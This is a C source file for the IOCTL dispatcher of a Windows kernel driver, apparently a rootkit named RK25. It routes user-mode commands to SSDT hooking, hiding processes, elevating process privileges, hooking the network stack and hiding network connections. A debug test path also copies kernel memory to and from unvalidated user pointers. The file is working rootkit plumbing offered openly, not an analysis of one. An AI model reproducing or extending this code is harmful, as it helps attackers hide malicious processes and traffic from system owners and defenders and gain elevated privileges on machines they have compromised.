#pragma once

#include "rk25_dispatcher.h"

#define RK25_PROLOG_DISPATCH "IOCTL Dispatcher"

NTSTATUS DriverDispatch(IN PDEVICE_OBJECT DeviceObject, IN PIRP pIrp) {
	NTSTATUS status = STATUS_SUCCESS;
	UCHAR* in = NULL;
	UCHAR* out = NULL;
	ULONG ioctl = 0, inlen = 0, outlen = 0, info = 0;
	PIO_STACK_LOCATION pIrpStack = IoGetCurrentIrpStackLocation(pIrp);

	RK25_DBG_INFO(RK25_PROLOG_DISPATCH, "-------------DeviceIOCTL-------------");
	RK25_DBG_INFO_F(RK25_PROLOG_DISPATCH, "Ioctl code:\t\t%X", pIrpStack->Parameters.DeviceIoControl.IoControlCode);
	RK25_DBG_INFO_F(RK25_PROLOG_DISPATCH, "Input length:\t%d", pIrpStack->Parameters.DeviceIoControl.InputBufferLength);
	RK25_DBG_INFO_F(RK25_PROLOG_DISPATCH, "Output length:\t%d", pIrpStack->Parameters.DeviceIoControl.OutputBufferLength);
	RK25_DBG_INFO_F(RK25_PROLOG_DISPATCH, "System buffer:\t0x%p", pIrp->AssociatedIrp.SystemBuffer);
	RK25_DBG_INFO_F(RK25_PROLOG_DISPATCH, "Type3InputBuffer:\t0x%p", pIrpStack->Parameters.DeviceIoControl.Type3InputBuffer);
	RK25_DBG_INFO_F(RK25_PROLOG_DISPATCH, "User buffer:\t\t0x%p", pIrp->UserBuffer);
	RK25_DBG_INFO(RK25_PROLOG_DISPATCH, "-------------DeviceIOCTL-------------");

	ioctl = pIrpStack->Parameters.DeviceIoControl.IoControlCode;
	inlen = pIrpStack->Parameters.DeviceIoControl.InputBufferLength;
	outlen = pIrpStack->Parameters.DeviceIoControl.OutputBufferLength;

	if ((ioctl & 0x3) == METHOD_BUFFERED) {
		in = out = (UCHAR*)pIrp->AssociatedIrp.SystemBuffer;
	}
	else { // METHOD_NEITHER
		in = (UCHAR*)pIrpStack->Parameters.DeviceIoControl.Type3InputBuffer;
		out = (UCHAR*)pIrp->UserBuffer;
	}

	__try {
		if (inlen == sizeof(RK25_IB) && in) {
			PRK25_IB data = (PRK25_IB)in;
			if (data->attr && data->buffer) {
				switch (ioctl)
				{
#if DBG
				case RK25_IOCTL_TEST_BUFFERED:
				{
					RK25_DBG_INFO_F(RK25_PROLOG_DISPATCH, "Buffer pointer:%p size:%d str:\"%s\"", data->buffer, data->attr, (char*)data->buffer);
					info = data->attr;
					break;
				}
				case RK25_IOCTL_TEST_NEITHER:
				{
					if (outlen == sizeof(RK25_IB)) {
						PRK25_IB data_in = (PRK25_IB)in;
						PRK25_IB data_out = (PRK25_IB)out;

						RK25_DBG_INFO_F(RK25_PROLOG_DISPATCH, "Buffer IN  pointer:%p size:%d str:\"%s\"", data_in->buffer, data_in->attr, (char*)data_in->buffer);
						RK25_DBG_INFO_F(RK25_PROLOG_DISPATCH, "Buffer OUT pointer:%p size:%d str:\"%s\"", data_out->buffer, data_out->attr, (char*)data_out->buffer);
						if (data_in->buffer != data_out->buffer) {
							RtlZeroMemory(data_out->buffer, data_out->attr);
							RtlCopyMemory(data_out->buffer, data_in->buffer, data_out->attr);
							RK25_DBG_ERR_F(RK25_PROLOG_DISPATCH, "Buffer OUT pointer:%p size:%d str:\"%s\"", data_out->buffer, data_out->attr, (char*)data_out->buffer);
						}
						info = data_out->attr;
					}
					else {
						RK25_DBG_ERR(RK25_PROLOG_DISPATCH, "Invalid output buffer size");
						status = STATUS_INVALID_BUFFER_SIZE;
					}
					break;
				}
#endif
				/***********************************PROCESS***********************************/
				case RK25_IOCTL_HOOK_SSDT_QUERY:
				{
					RK25_DBG_INFO(RK25_PROLOG_DISPATCH, "Hook/unhook SSDT called");
					status = RK25ProcessHook(data->attr);
					break;
				}
				case RK25_IOCTL_PROC_HIDE:
				{
					RK25_DBG_INFO(RK25_PROLOG_DISPATCH, "Process hide called");
					status = RK25ProcessHide(data->attr, data->buffer);
					break;
				}
				case RK25_IOCTL_PROC_PRIV:
				{
					RK25_DBG_INFO(RK25_PROLOG_DISPATCH, "Process elevate priv called");
					status = RK25ProcessPriv(data->attr, (HANDLE)data->buffer);
					break;
				}
				case RK25_IOCTL_PROC_PROTECT:
				{
					RK25_DBG_INFO(RK25_PROLOG_DISPATCH, "Process protect called");
					status = STATUS_NOT_SUPPORTED;
					break;
				}
				/***********************************PROCESS***********************************/

				/*************************************NET*************************************/
				case RK25_IOCTL_HOOK_NET:
				{
					RK25_DBG_INFO(RK25_PROLOG_DISPATCH, "Hook/unhook net");
					status = RK25NetHook(data->attr);
					break;
				}
				case RK25_IOCTL_NET_HIDE:
				{
					RK25_DBG_INFO(RK25_PROLOG_DISPATCH, "Hide/unhide net");
					status = RK25NetHide(data->attr, data->buffer);
					break;
				}
				/*************************************NET*************************************/

				default:
					RK25_DBG_ERR(RK25_PROLOG_DISPATCH, "Unsupported ioctl code");
					status = STATUS_INVALID_PARAMETER;
					break;
				}
				info = sizeof(RK25_IB);
			}
			else {
				RK25_DBG_ERR(RK25_PROLOG_DISPATCH, "The data command is empty");
				status = STATUS_INVALID_PARAMETER;
			}
		}
		else {
			RK25_DBG_ERR(RK25_PROLOG_DISPATCH, "Invalid input buffer size");
			status = STATUS_INVALID_BUFFER_SIZE;
		}
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {
		PEXCEPTION_RECORD exrec = GetExceptionInformation()->ExceptionRecord;
		RK25_DBG_EXCEPT(RK25_PROLOG_DISPATCH, exrec);
		status = STATUS_UNSUCCESSFUL;
	}

	pIrp->IoStatus.Status = status;
	pIrp->IoStatus.Information = info;
	IoCompleteRequest(pIrp, IO_NO_INCREMENT);
	return status;
}